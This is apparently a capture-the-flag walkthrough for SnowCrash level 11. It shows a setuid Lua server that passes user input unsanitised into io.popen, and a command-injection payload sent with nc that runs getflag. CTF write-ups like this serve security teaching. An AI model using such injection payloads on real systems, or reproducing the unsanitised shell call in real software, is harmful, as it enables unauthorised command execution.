## 1. Connect to level11:

```bash
level10@SnowCrash:~$ su level11
password: *use previously found flag*
```

## 2. See existing files:

```bash
level11@SnowCrash:~$ ls -l
    -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

```bash
level11@SnowCrash:~$ cat level11.lua
```

The content of `level11.lua` shows:

That the server runs on localhost, port 5151
``` bash
local server = assert(socket.bind("127.0.0.1", 5151))
```

That the command `echo [pass] | sha1sum` is executed
```bash
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

## 3. Use a command injection to find the flag:
```bash
level11@SnowCrash:~$ echo 'test; getflag > /tmp/flag11' | nc localhost 5151
    Password: Erf nope..

level11@SnowCrash:~$ cat /tmp/flag11
```